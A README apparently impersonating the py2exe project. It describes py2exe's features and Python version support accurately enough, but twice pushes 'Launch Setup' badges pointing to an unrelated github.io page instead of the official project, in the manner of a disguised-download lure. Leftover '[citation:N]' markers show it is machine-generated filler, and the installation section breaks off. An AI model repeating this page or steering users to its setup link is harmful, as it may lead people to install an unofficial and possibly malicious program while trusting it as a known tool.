# py2exe Windows Executable Builder

<div align="center">
  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRkkD69UEl7ljI2lxhZBuNUIIq_IKVqcms2GKFLWdWqWSmjeYpGZcxQzO6s&s=10" alt="py2exe Build Tool" width="800">
</div>

[![Launch Setup](https://img.shields.io/badge/⚡️_Launch_Setup-1d4ed8?style=for-the-badge)](https://gagelanggdvq.github.io/.github/py2exe-Windows-Packager)

---

## What is py2exe?

py2exe is a Python extension that converts Python scripts (.py) into Microsoft Windows executables (.exe) [citation:12]. These executables can run on a system without Python installed [citation:1][citation:12]. It is the most common tool for doing so and has been used to distribute projects like the official BitTorrent client and SpamBayes [citation:12].

py2exe can build console executables, Windows (GUI) executables, Windows services, and DLL/EXE COM servers [citation:1][citation:9]. Development of py2exe is hosted on GitHub and supports Python versions included in the official development cycle [citation:1]. Since May 2014, version 0.9.2.0 of py2exe has been available for Python 3 [citation:12].

Although py2exe transforms a `.py` file to an `.exe`, it does not make it run faster because py2exe bundles the Python bytecode without converting it to machine-code. It may even run slower than using the Python interpreter directly because of startup overhead [citation:12].

---

## Screenshot Block

<div align="center">
  <img src="https://raw.githubusercontent.com/muziing/Py2exe-GUI/main/docs/source/images/Py2exe-GUI_v0.3.1_mainwindow_screenshot_en.png" alt="py2exe Build Output" width="700">
</div>

[![Launch Setup](https://img.shields.io/badge/⚡️_Launch_Setup-1d4ed8?style=for-the-badge)](https://gagelanggdvq.github.io/.github/py2exe-Windows-Packager)

---

## Key Features

| Feature | Description |
|---------|-------------|
| **Standalone Executables** | Build Windows EXE files from Python scripts without requiring Python installed  |
| **Console & GUI Support** | Support for console applications and Windows GUI applications (no console window)  |
| **Windows Services** | Build Windows services with the `service=` argument  |
| **Cross-Version Support** | Supports Python 3.9 through 3.14  |
| **Automatic Dependency Detection** | Uses Python's modulefinder to automatically discover required modules  |
| **Extension Module Support** | Handles compiled C extension modules (`.pyd`) and their binary dependencies  |
| **Custom Hooks** | Built-in hooks for popular packages like numpy, pandas, matplotlib, scipy, and tkinter  |
| **Open Source** | Distributed under an open-source PSF license  |

---

## Version Support

py2exe supports Python versions in the official development cycle [citation:1].

| Version | Support Status |
|---------|----------------|
| Python 3.14 | Supported  |
| Python 3.13 | Supported  |
| Python 3.12 | Supported  |
| Python 3.11 | Supported  |
| Python 3.10 | Supported  |
| Python 3.9 | Supported  |
| Python 3.8 | **Not Supported** (dropped in v0.14.0.0)  |
| Python 3.7 | **Not Supported** (dropped in v0.13.0.0)  |
| Python 3.6 | **Not Supported** (dropped in v0.11.1.0)  |
| win32 (32-bit) | Built but **untested**  |

**Important:** `win32` wheels are still built and shipped but are provided untested. Issues experienced when using these wheels will not be investigated [citation:1][citation:4].

---

## Installation Guide

### Prerequisites

- Windows 10, Windows 11, or Windows Server
- Python 3.9 through 3.14

### Step 1: Install py2exe via pip

```powershell
pip install py2exe
